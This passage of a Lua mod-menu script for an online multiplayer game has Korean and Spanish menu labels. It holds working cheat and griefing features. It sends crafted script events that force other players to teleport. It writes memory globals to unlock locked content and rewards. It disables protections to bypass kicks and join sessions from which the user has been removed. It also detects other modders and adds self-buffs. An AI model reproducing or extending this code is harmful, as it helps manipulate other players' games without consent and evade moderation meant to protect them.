    ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    -- Other

    local sevents = menu.list(otherc, "이벤트", {}, "스크립트에 의해 생성된 이벤트.")

    local tps = menu.list(sevents, "Tp's", {}, "tp 플레이어 이벤트.")

    menu.action(sevents, "카요 페리코", {}, "카요 보내기 위해 다양한 방법을 시도하십시오. \n 아주 좋은 메뉴가 없으면 작동합니다. \n스탠드에서 작동할 가능성이 있습니다.", function()
        menu.trigger_commands("scripthost")
        for i = 1, 200 do
            util.trigger_script_event(1 << player_id, {-910497748, player_id, 1, 0})
        end
    end)

    menu.action(sevents, "카요 페리코 SC", {}, "카요에게 보낼 방법을 여러 번 시도합니다.", function()
        menu.trigger_commands("scripthost")
        for i = 1, 200 do
            util.trigger_script_event(1 << player_id, {-93722397, player_id, 0, 0, 4, 1})
        end
    end)

    menu.action(tps, "키디온 카요 페리코", {}, "대부분의 메뉴에 의해 차단되었습니다.", function()
        menu.trigger_commands("scripthost")
        util.trigger_script_event(1 << player_id, {-93722397, player_id, 0, 0, 4, 0})
    end)

    menu.action(tps, "과거 쿠데타", {}, "대부분의 메뉴에 의해 차단되었습니다.", function()
        menu.trigger_commands("scripthost")
        util.trigger_script_event(1 << player_id, {-168599209, players.user(), player_id, -1, 1, 1, 0, 1, 0}) 
    end) 

    menu.action(tps, "Trapo Al Jugador", {}, "", function()
        menu.trigger_commands("scripthost")
        util.trigger_script_event(1 << player_id, {2009283752247, player_id, 2005749727232, 1, 258, 1, 1, player_id, 2701534429183, 18, 0})
    end)

    menu.action(otherc, "플레이어 마크", {}, "플레이어가 맵에 가지고 있는 마크를 보여주어야 합니다.", function()
        local playerw = players.get_waypoint(player_id)
        for i = 1, 5 do
            HUD.REFRESH_WAYPOINT()
        end
        HUD.SET_NEW_WAYPOINT(playerw, playerw, false)
        util.yield(2000)
        util.toast("플레이어의 마크는 이미 지도에 나와 있어야 합니다.")
        util.yield(500)
        util.toast("아마 나오지 않으면 마크가 없을 거예요.")
    end)

    menu.toggle(otherc, "Spectear Automatico", {}, "Usara un metodo u otro dependiendo su estado.", function(on)
        local spec_2 = menu.ref_by_rel_path(menu.player_root(player_id), "Spectate>Ninja Method")
        local spec_1 = menu.ref_by_rel_path(menu.player_root(player_id), "Spectate>Legit Method")
        if on then
            if ryze.get_interior_of_player(player_id) == 0 then
                spec_1.value = false
                spec_2.value = true
            else
                spec_2.value = false
                spec_1.value = true
            end 
        else 
            menu.trigger_commands("stopspectating")
        end 

    end)
        
end)

menu.action(world, "Limpiar Area", {"rcleararea"}, "Limpia todo en el area", function(on_click)
    clear_area(clear_radius)
    util.toast('청정지역:3')
end)

menu.action(world, "월드 청소", {"rclearworld"}, "그것은 말 그대로 NPC, 자동차, 물건, 볼 등을 포함한 그 지역의 모든 것을 청소한다.", function(on_click)
    clear_area(1000000)
    util.toast('깨끗한 세상 :3')
end)

menu.slider(world, "라디오 청소", {}, "청소용 라디오", 100, 10000, 100, 100, function(s)
    radius = s
end)


--------------------------------------------------------------------------------------------------------------------------------
--Detecciones
menu.toggle_loop(detections, "무적 모드", {}, "무적모드가 감지되면 나올 것이다.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        for i, interior in ipairs(interior_stuff) do
            if players.is_godmode(player_id) and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and ryze.get_spawn_state(player_id) == 99 and ryze.get_interior_of_player(player_id) == interior then
                util.draw_debug_text(players.get_name(player_id) .. " 무적 모드 입니다.")
                break
            end
        end
    end 
end)

menu.toggle_loop(detections, "무적 차량", {}, "차 안에서 무적모드가 발견되면 나올 것이다.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            for i, interior in ipairs(interior_stuff) do
                if not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(player_veh) and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and ryze.get_spawn_state(player_id) == 99 and ryze.get_interior_of_player(player_id) == interior then
                    util.draw_debug_text(players.get_name(player_id) .. " 무적 차량에 타고 있습니다.")
                    break
                end
            end
        end
    end 
end)

menu.toggle_loop(detections, "모드 무기", {}, "혹시 휘파람을 불지 않은 총이 있다면 말해보세요.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        for i, hash in ipairs(ryze.modded_weapons) do
            local weapon_hash = util.joaat(hash)
            if WEAPON.HAS_PED_GOT_WEAPON(ped, weapon_hash, false) and (WEAPON.IS_PED_ARMED(ped, 7) or TASK.GET_IS_TASK_ACTIVE(ped, 8) or TASK.GET_IS_TASK_ACTIVE(ped, 9)) then
                util.toast(players.get_name(player_id) .. " 그는 무장을 하고 있다")
                break
            end
        end
    end
end)

menu.toggle_loop(detections, "모드 자동차", {}, "그가 모드 차를 가지고 있다면 나오라", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(player_id)
        for i, name in ipairs(ryze.modded_vehicles) do
            if modelHash == util.joaat(name) then
                util.draw_debug_text(players.get_name(player_id) .. " 그는 개조된 차를 가지고 있다")
                break
            end
        end
    end
end)

menu.toggle_loop(detections, "실내 무기", {}, "실내에서 무기를 사용하면 나올 것입니다.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        if players.is_in_interior(player_id) and WEAPON.IS_PED_ARMED(player, 7) then
            util.draw_debug_text(players.get_name(player_id) .. " 실내에서 총을 사용하고 있습니다.")
            break
        end
    end
end)

menu.toggle_loop(detections, "모더 감지", {}, "플레이어가 밴을 할 것인지 여부를 감지합니다.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local reason = NETWORK.NETWORK_PLAYER_GET_CHEATER_REASON(player_id)
        if NETWORK.NETWORK_PLAYER_IS_CHEATER(player_id) then
            util.draw_debug_text(players.get_name(player_id) .. " 그는 곧 쓰러질 것이다 :u, razon:", reason)
            break
        end
    end
end)

menu.toggle_loop(detections, "빨리 달려라", {}, "더 빨리 달렸는지 감지해", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local ped_speed = (ENTITY.GET_ENTITY_SPEED(ped)* 2.236936)
        if not util.is_session_transition_active() and ryze.get_interior_of_player(player_id) == 0 and get_transition_state(player_id) ~= 0 and not PED.IS_PED_DEAD_OR_DYING(ped) 
        and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_IN_ANY_VEHICLE(ped, false)
        and not TASK.IS_PED_STILL(ped) and not PED.IS_PED_JUMPING(ped) and not ENTITY.IS_ENTITY_IN_AIR(ped) and not PED.IS_PED_CLIMBING(ped) and not PED.IS_PED_VAULTING(ped)
        and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) <= 300.0 and ped_speed > 30 then -- fastest run speed is about 18ish mph but using 25 to give it some headroom to prevent false positives
            util.toast(players.get_name(player_id) .. " 모드 슈퍼 달리기")
            break
        end
    end
end)

menu.toggle_loop(detections, "노클립", {}, "플레이어가 공중부양하는지 감지합니다.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local ped_ptr = entities.handle_to_pointer(ped)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local oldpos = players.get_position(player_id)
        util.yield()
        local currentpos = players.get_position(player_id)
        local vel = ENTITY.GET_ENTITY_VELOCITY(ped)
        if not util.is_session_transition_active() and players.exists(player_id)
        and ryze.get_interior_of_player(player_id) == 0 and ryze.get_spawn_state(player_id) ~= 0
        and not PED.IS_PED_IN_ANY_VEHICLE(ped, false) -- too many false positives occured when players where driving. so fuck them. lol.
        and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped)
        and not PED.IS_PED_CLIMBING(ped) and not PED.IS_PED_VAULTING(ped) and not PED.IS_PED_USING_SCENARIO(ped)
        and not TASK.GET_IS_TASK_ACTIVE(ped, 160) and not TASK.GET_IS_TASK_ACTIVE(ped, 2)
        and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) <= 395.0 -- 400 was causing false positives
        and ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(ped) > 5.0 and not ENTITY.IS_ENTITY_IN_AIR(ped) and entities.player_info_get_game_state(ped_ptr) == 0
        and oldpos.x ~= currentpos.x and oldpos.y ~= currentpos.y and oldpos.z ~= currentpos.z 
        and vel.x == 0.0 and vel.y == 0.0 and vel.z == 0.0 then
            util.toast(players.get_name(player_id) .. " 공중 부양을 사용중 입니다.")
            break
        end
    end
end)

menu.toggle_loop(detections, "관전 감지", {}, "그가 당신을 관전하는지 아니면 다른 사람을 관전하는지 감지합니다.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        for i, interior in ipairs(interior_stuff) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
            if not util.is_session_transition_active() and ryze.get_spawn_state(player_id) ~= 0 and ryze.get_interior_of_player(player_id) == interior
            and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped) then
                if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_cam_pos(player_id)) < 15.0 and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) > 20.0 then
                    util.toast(players.get_name(player_id) .. " 당신을 보고 있어요.")
                    break
                end
            end
        end
    end
end)

menu.toggle_loop(detections, "텔레포트 감지", {}, "플레이어가 텔레포트되는지 여부를 감지합니다.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        if not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped) then
            local oldpos = players.get_position(player_id)
            util.yield(1000)
            local currentpos = players.get_position(player_id)
            for i, interior in ipairs(interior_stuff) do
                if v3.distance(oldpos, currentpos) > 500 and oldpos.x ~= currentpos.x and oldpos.y ~= currentpos.y and oldpos.z ~= currentpos.z 
                and get_transition_state(player_id) ~= 0 and ryze.get_interior_of_player(player_id) == interior and PLAYER.IS_PLAYER_PLAYING(player_id) and player.exists(player_id) then
                    util.toast(players.get_name(player_id) .. " 방금 텔레포트를 통해")
                end
            end
        end
    end
end)

menu.toggle_loop(detections, "스마트 킥", {}, "그는 그들이 매우 빨리 회의에서 누군가를 추방하는 것에 투표하는지 감지하고 경고합니다.  스탠드업 스마트 킥으로 더 잘 알려져 있습니다.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local kickowner = NETWORK.NETWORK_SESSION_GET_KICK_VOTE(player_id)
        local kicked = NETWORK.NETWORK_SESSION_KICK_PLAYER(player_id)
        if kicked then
            util.draw_debug_text(players.get_name(player_id) .. " 플레이어는", kicked, "다음과 같은 이유로 킥킥거렸습니다.", kickowner)
            break
        end
    end
end)

menu.toggle_loop(detections, "빨리 합류하세요.", {}, "RID조인 감지.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        if not util.is_session_transition_active() and ryze.get_spawn_state(player_id) == 0 and players.get_script_host() == player_id  then
            util.toast(players.get_name(player_id) .. " 모더로 감지 되었습니다.")
        end
    end
end)

--------------------------------------------------------------------------------------------------------------------------------
--Self

menu.toggle(selfc, "락온 방지", {}, "열 신호를 제거하세요.\n어떤 선수들은 여전히 당신을 볼 수 있습니다.", function(toggle)
    local player = players.user_ped()
    if toggle then
        PED.SET_PED_HEATSCALE_OVERRIDE(player, 0)
    else
        PED.SET_PED_HEATSCALE_OVERRIDE(player, 1)
    end
end)

local maxHealth <const> = 328
menu.toggle_loop(selfc, ("좀비 모드 레이더"), {"undeadotr"}, "", function()
	if ENTITY.GET_ENTITY_MAX_HEALTH(players.user_ped()) ~= 0 then
		ENTITY.SET_ENTITY_MAX_HEALTH(players.user_ped(), 0)
	end
end, function ()
	ENTITY.SET_ENTITY_MAX_HEALTH(players.user_ped(), maxHealth)
end)

menu.toggle_loop(selfc, "무기 변경 모션 없음", {}, "무기 빨리 바꿔", function()
    if TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 56) then
        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
    end
    if TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 92) then
        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
    end
    if (TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 160) or TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 167) or TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 165)) and not TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 195) then
        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
    end
end)

menu.toggle_loop(selfc, "무기 재장전 속도", {}, "빠른 장전", function()
    local player = players.user_ped()
    local pointr = entities.handle_to_pointer(player)
    if entities.get_health(pointr) < 100 then
        GRAPHICS.ANIMPOSTFX_STOP_ALL()
        memory.write_int(memory.script_global(2672505 + 1684 + 756), memory.read_int(memory.script_global(2672505 + 1684 + 756)) | 1 << 1) -- Jinx Taken
    end
end)

local s_forcefield_range = 10
local s_forcefield = 0
local s_forcefield_names = {
    [0] = "Push",
    [1] = "Pull"
}

menu.toggle_loop(selfc, "캄포 데 포스", {"sforcefield"}, "", function()
    if players.exists(players.user()) then
        local _entities = {}
        local player_pos = players.get_position(players.user())

        for _, vehicle in pairs(entities.get_all_vehicles_as_handles()) do
            local vehicle_pos = ENTITY.GET_ENTITY_COORDS(vehicle, false)
            if v3.distance(player_pos, vehicle_pos) <= s_forcefield_range then
                table.insert(_entities, vehicle)
            end
        end
        for _, ped in pairs(entities.get_all_peds_as_handles()) do
            local ped_pos = ENTITY.GET_ENTITY_COORDS(ped, false)
            if (v3.distance(player_pos, ped_pos) <= s_forcefield_range) and not PED.IS_PED_A_PLAYER(ped) then
                table.insert(_entities, ped)
            end
        end
        for i, entity in pairs(_entities) do
            local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
            local entity_type = ENTITY.GET_ENTITY_TYPE(entity)

            if NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity) and not (player_vehicle == entity) then
                local force = ENTITY.GET_ENTITY_COORDS(entity)
                v3.sub(force, player_pos)
                v3.normalise(force)

                if (s_forcefield == 1) then
                    v3.mul(force, -1)
                end
                if (entity_type == 1) then
                    PED.SET_PED_TO_RAGDOLL(entity, 500, 0, 0, false, false, false)
                end

                ENTITY.APPLY_FORCE_TO_ENTITY(
                    entity, 3, force.x, force.y, force.z, 0, 0, 0.5, 0, false, false, true, false, false
                )
            end
        end
    end
end)

menu.slider(selfc, "지역 투명성", {"transparency"}, "지금은 잘 안 되네요, 나중에 고쳐보도록 하겠습니다", 0, 100, 100, 20, function(value)
    if value > 80 then
        ENTITY.RESET_ENTITY_ALPHA(players.user_ped())
    else
        ENTITY.SET_ENTITY_ALPHA(players.user_ped(), value * 2.55, false)
    end
end)

--------------------------------------------------------------------------------------------------------------------------------
--Online

menu.toggle_loop(online, "스크립트 호스트", {}, "호스트 스크립트에 중독이 됩니다.", function()
    if players.get_script_host() ~= players.user() and get_spawn_state(players.user()) ~= 0 then
        menu.trigger_command(menu.ref_by_path("Players>"..players.get_name_with_tags(players.user())..">Friendly>Give Script Host"))
    end
end)

menu.toggle(online, "안티 채팅", {}, "채팅 '아이콘'을 쓸 때 안 나오게 해요", function()
	if on then
		menu.trigger_commands("hidetyping on")
	else
		menu.trigger_commands("hidetyping off")
	end
end)

menu.toggle_loop(online, "라유니온을 받아들임", {}, "자동으로 결합하는 화면을 받아들이게 됩니다.", function() -- credits to jinx for letting me steal this
    local message_hash = HUD.GET_WARNING_SCREEN_MESSAGE_HASH()
    if message_hash == 15890625 or message_hash == -398982408 or message_hash == -587688989 then
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 201, 1.0)
        util.yield(50)
    end
end)

--menu.toggle(online, "Armas Termicas 'Test'", {}, "Hace todas tus armas con mira termica con la tecla. E", function()
--    if PLAYER.IS_PLAYER_FREE_AIMING(PLAYER.PLAYER_PED_ID()) then
--        if PAD.IS_CONTROL_JUST_PRESSED(69, 69) then
--            menu.trigger_commands("thermalvision on")
--            GRAPHICS.SEETHROUGH_SET_MAX_THICKNESS(50)
--        else
--            menu.trigger_commands("thermalvision off")
--            GRAPHICS.SET_SEETHROUGH(false)
--            GRAPHICS.SEETHROUGH_SET_MAX_THICKNESS(1) --default value is 1
--        end
--    elseif GRAPHICS.GET_USINGSEETHROUGH() then
--        menu.trigger_commands("thermalvision off")
--        GRAPHICS.SEETHROUGH_SET_MAX_THICKNESS(1)
--    end
--end)

joining = false
menu.toggle(online, "플레이어 알림", {}, "플레이어가 세션에 들어갈 때 경고합니다.", function(on_toggle)
	if on_toggle then
		joining = true
	else
		joining = false
	end
end)

local maxps = menu.list(online, "호스트 도구", {}, "")

menu.slider(maxps, "플레이어 최대", {}, "로비의 최대 선수\n여러분이 호스트일 때만 작동합니다.", 1, 32, 32, 1, function (value)
    if Stand_internal_script_can_run then
        NETWORK.NETWORK_SESSION_SET_MATCHMAKING_GROUP_MAX(0, value)
        util.toast("free slots",NETWORK.NETWORK_SESSION_GET_MATCHMAKING_GROUP_FREE(0))
    end
end)

menu.slider(maxps, "최대 관전", {}, "최대 관전은\n호스트일 때만 작동합니다.", 0, 2, 2, 1, function (value)
    if Stand_internal_script_can_run then
        NETWORK.NETWORK_SESSION_SET_MATCHMAKING_GROUP_MAX(4, value)
        util.toast("프리 슬로프",NETWORK.NETWORK_SESSION_GET_MATCHMAKING_GROUP_FREE(4))
    end
end)

--menu.toggle(online, "Tiempo Real", {}, "Hace tu juego concordar con la hora actual de tu ubicacion.", function(toggle)
--    irlTime = toggle
--    local smoothTimeOn = menu.get_value(smoothTransitionCommand) == 1
--    toggleSwitchState(smoothTransitionCommand, smoothTimeOn)
--    util.create_tick_handler(function()
--        menu.trigger_command(setClockCommand, os.date("%H:%M:%S"))
--        return irlTime
--    end)
--    toggleSwitchState(smoothTransitionCommand, smoothTimeOn)
--end)

local servicios = menu.list(online, "서비스", {}, "")

menu.action(servicios, "헬리콥터 호출", {}, "귀하의 위치로 고급 헬리콥터를 요청하십시오", function(on_toggle)
    if NETWORK.NETWORK_IS_SESSION_ACTIVE() and
	not NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_heli_taxi", -1, true, 0) then
        ryze.int(2793044 + 888, 1)
        ryze.int(2793044 + 895, 1)
	end
end)

menu.action(servicios, "현상금 삭제 'Test'", {}, "만약 현상금이 있다면 보상을 받을 수 있습니다.", function()
    if memory.read_int(memory.script_global(1835502 + 4 + 1 + (players.user() * 3))) == 1 then
        memory.write_int(memory.script_global(2815059 + 1856 + 17), -1)
        memory.write_int(memory.script_global((2359296+1) + 5149 + 13), 2880000)
    else 
        util.toast("너는 보상이 없어 :3")
    end    
end)

local recovery = menu.list(online, "리커버리", {}, "")

-- local coleccionables = menu.list(recovery, "수집품", {}, "")

-- menu.click_slider(coleccionables, "고삐", {""}, "", 0, 9, 0, 1, function(i)
--     util.trigger_script_event(1 << players.user(), {697566862, players.user(), 0x0, i, 1, 1, 1})
-- end)

-- menu.click_slider(coleccionables, "숨겨진 캐시", {""}, "", 0, 9, 0, 1, function(i)
--     util.trigger_script_event(1 << players.user(), {697566862, players.user(), 0x1, i, 1, 1, 1})
-- end)

-- menu.click_slider(coleccionables, "상자/보물", {""}, "", 0, 1, 0, 1, function(i)
--     util.trigger_script_event(1 << players.user(), {697566862, players.user(), 0x2, i, 1, 1, 1})
-- end)

-- menu.click_slider(coleccionables, "라디오 안테나", {""}, "", 0, 9, 0, 1, function(i)
--     util.trigger_script_event(1 << players.user(), {697566862, players.user(), 0x3, i, 1, 1, 1})
-- end)

-- menu.click_slider(coleccionables, "USB", {""}, "", 0, 19, 0, 1, function(i)
--     util.trigger_script_event(1 << players.user(), {697566862, players.user(), 0x4, i, 1, 1, 1})
-- end)

-- menu.action(coleccionables, "난파선", {""}, "", function()
--     util.trigger_script_event(1 << players.user(), {697566862, players.user(), 0x5, 0, 1, 1, 1})
-- end)

-- menu.click_slider(coleccionables, "묻힌", {""}, "", 0, 1, 0, 1, function(i)
--     util.trigger_script_event(1 << players.user(), {697566862, players.user(), 0x6, i, 1, 1, 1})
-- end)

-- menu.action(coleccionables, "할로윈 티셔츠", {""}, "", function()
--     util.trigger_script_event(1 << players.user(), {697566862, players.user(), 0x7, 1, 1, 1, 1})
-- end)

-- menu.click_slider(coleccionables, "호박 등불", {""}, "", 0, 9, 0, 1, function(i)
--     util.trigger_script_event(1 << players.user(), {697566862, players.user(), 0x8, i, 1, 1, 1})
-- end)

-- menu.click_slider(coleccionables, "라마 유기농 제품", {""}, "", 0, 99, 0, 1, function(i)
--     util.trigger_script_event(1 << players.user(), {697566862, players.user(), 0x9, i, 1, 1, 1})
-- end)

-- menu.click_slider(coleccionables, "정크 에너지 무료 비행", {""}, "", 0, 9, 0, 1, function(i)
--     util.trigger_script_event(1 << players.user(), {697566862, players.user(), 0xA, i, 1, 1, 1})
-- end)

local drugwars = menu.list(recovery, "마약 전쟁", {}, "마약 전쟁의 콘텐츠입니다.")

menu.action(drugwars, "차고 잠금 해제", {}, "새 차고를 일시적으로 잠급니다. \n세션이 변경되면 사라집니다.", function()
    util.toast("프로세스 시작.")
    util.toast("2초 정도 걸립니다.")
    local player = PLAYER.PLAYER_PED_ID()
    ENTITY.SET_ENTITY_COORDS(player, -285.96716, 273.57812, 89.13905, 1, false)
    util.yield(1000)
    memory.write_byte(memory.script_global(262145 + 32702), 1)
    memory.write_byte(memory.script_global(262145 + 32688), 0)
    util.toast("다 끝났으니 들어가거나 구매 가능합니다.")
end)

menu.action(drugwars, "콘/크리스마스 잠금 해제", {}, "세션 변경 후 크리스마스 콘텐츠가 해제됩니다.", function()
    memory.write_byte(memory.script_global(262145 + 33915), 1)  
    memory.write_byte(memory.script_global(262145 + 33916), 1)  
end)

menu.action(drugwars, "콘/DLC 잠금 해제", {}, "새로운 DLC의 내용을 차단할 수 있도록 해줬습니다. 아마 세션 때문이었을 겁니다.", function()
    menu.trigger_commands("scripthost")
    util.yield(50)
    for i = 33974, 34112, 1 do
        memory.write_byte(memory.script_global(262145 + i), 1)  
    end
end)

menu.action(drugwars, "미션 잠금 해제", {}, "내가 다 풀어줄게. 새로운 임무 중 하나를 포함", function()
    menu.trigger_commands("scripthost")
    util.toast("너는 btw 티셔츠를 가질 것이다.")
    util.yield(50)
    util.toast("새로운 임무와 영업사원들, 그리고 누가 알겠습니까?")
    for i = 33910, 34794, 1 do
        memory.write_byte(memory.script_global(262145 + i), 1)  
    end
end)

-- menu.action(drugwars, "차단을 해제하다.", {}, "총기를 풀어줄 거야", function()
--     local player = PLAYER.PLAYER_PED_ID()
--     menu.trigger_commands("scripthost")
--     util.yield(50)
--     for i = 0, 29 do
--         memory.write_byte(memory.script_global(262145 + 33800 + 1 + i), 1)
--     end
--     memory.write_byte(memory.script_global(262145 + 33799), 1)
-- end)

menu.action(drugwars, "도둑을 부르다. 'Test'", {}, "선물을 주는 도둑을 불러라.", function()
    local player = PLAYER.PLAYER_PED_ID()
    menu.trigger_commands("scripthost")
    memory.write_byte(memory.script_global(2756261 + 171), 1)
    memory.write_byte(memory.script_global(2756259 + 6), 1)
end)

menu.toggle_loop(drugwars, "델 택시의 미션", {}, "", function() -- credit to sapphire for all of this <3 / Also Prisuhm, this is hes code.
    if memory.read_byte(memory.script_global(262145 + 33770)) ~= 1 then
        memory.write_byte(memory.script_global(262145 + 33770), 1)
    return end
end)

local bypasskick = menu.list(online, "바이패스 킥", {}, "당신이 모든 수단을 동원하여 \n 만약 그들이 당신을 막고 있다면, 그 세션에 들어갈 수 있습니다.")

local normalmeth = menu.list(bypasskick, "일반 방법")

menu.toggle(normalmeth, "크래쉬 V1", {"bkick1"}, "조금 더 기능적이긴 하지만 더 많은 네트워크 오류가 있습니다.", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    local BlockBailing = menu.ref_by_path("Online>Protections>Block Bailing>Player No Longer In Session")
    local BlockBailing2 = menu.ref_by_path("Online>Protections>Block Bailing>Switching Primary Crew")
    local BlockBailing3 = menu.ref_by_path("Online>Protections>Block Bailing>Spectating Related")
    local BlockBailing4 = menu.ref_by_path("Online>Protections>Block Bailing>Other Reasons")
    local BlockJoin = menu.ref_by_path("Online>Protections>Block Join Karma")
    if on_toggle then
        menu.trigger_commands("nobgscript on")
        menu.trigger_commands("skipbroadcast on")
        menu.trigger_commands("speedupspawn on")
        menu.trigger_commands("speedupfmmc on")
        menu.trigger_commands("skipswoopdown on")
        menu.trigger_commands("nospawnactivities on")
        menu.trigger_commands("showtransitionstate on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_command(BlockBailing, "on")
        menu.trigger_command(BlockBailing2, "on")
        menu.trigger_command(BlockBailing3, "on")
        menu.trigger_command(BlockBailing4, "on")
        menu.trigger_command(BlockJoin, "on")
        util.toast("활성화, 이제 세션에 들어가서 킥을 준비합니다.")
    else
        menu.trigger_commands("nobgscript off")
        menu.trigger_commands("skipbroadcast off")
        menu.trigger_commands("speedupspawn off")
        menu.trigger_commands("speedupfmmc off")
        menu.trigger_commands("skipswoopdown off")
        menu.trigger_commands("nospawnactivities off")
        menu.trigger_commands("showtransitionstate off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_command(BlockBailing3, "off")
        util.toast("준비, 모두 해제.")
    end
end)

menu.toggle(normalmeth, "크래쉬 V2", {"bkick2"}, "보다 기능적인 방법이지만 개발자의 경우 모든 네트워크 이벤트에 대한 알림을 받게 됩니다.", function(on_toggle)
local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
local BlockBailing = menu.ref_by_path("Online>Protections>Block Bailing>Player No Longer In Session")
local BlockBailing2 = menu.ref_by_path("Online>Protections>Block Bailing>Switching Primary Crew")
local BlockBailing3 = menu.ref_by_path("Online>Protections>Block Bailing>Spectating Related")
local BlockBailing4 = menu.ref_by_path("Online>Protections>Block Bailing>Other Reasons")
local ShowNotis = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Notification>Enabled")
local BlockRaw = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
local UnShowNotis = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Notification>Disabled")
local UnBlockRaw = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
if on_toggle then
    menu.trigger_commands("nobgscript on")
    menu.trigger_commands("skipbroadcast on")
    menu.trigger_commands("speedupspawn on")
    menu.trigger_commands("speedupfmmc on")
    menu.trigger_commands("skipswoopdown on")
    menu.trigger_commands("nospawnactivities on")
    menu.trigger_commands("showtransitionstate on")
    menu.trigger_command(BlockIncSyncs)
    menu.trigger_command(BlockNetEvents)
    menu.trigger_command(BlockBailing, "on")
    menu.trigger_command(BlockBailing2, "on")
    menu.trigger_command(BlockBailing3, "on")
    menu.trigger_command(BlockBailing4, "on")
    menu.trigger_command(ShowNotis)
    menu.trigger_command(BlockRaw)
    util.toast("활성화, 이제 세션에 들어가서 킥을 준비합니다.")
else
    menu.trigger_commands("nobgscript off")
    menu.trigger_commands("skipbroadcast off")
    menu.trigger_commands("speedupspawn off")
    menu.trigger_commands("speedupfmmc off")
    menu.trigger_commands("skipswoopdown off")
    menu.trigger_commands("nospawnactivities off")
    menu.trigger_commands("showtransitionstate off")
    menu.trigger_command(UnblockIncSyncs)
    menu.trigger_command(UnblockNetEvents)
    menu.trigger_command(BlockBailing3, "off")
    menu.trigger_command(UnShowNotis)
    menu.trigger_command(UnBlockRaw)
    util.toast("준비, 모두 해제.")
end
end)

